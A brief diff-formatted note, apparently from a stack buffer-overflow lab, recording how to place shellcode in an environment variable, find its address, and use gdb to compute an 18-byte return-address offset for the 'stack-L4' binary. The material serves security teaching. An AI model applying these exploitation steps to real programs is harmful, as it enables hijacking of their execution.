@@ -1,0 +1,12 @@
+ok...now the buffer size is extremely so we cannot put the shellcode inside the buffer, 
+but use the environment variable approach
+
+$ ./getenv MYSHELLCODE ./stack-L4
+MYSHELLCODE will be at 0x7fffffffef91
+
+gdb-peda$ p $rbp
+$1 = (void *) 0x7fffffffd870
+gdb-peda$ p &buffer
+$2 = (char (*)[10]) 0x7fffffffd866
+
+RA - &buffer = 18
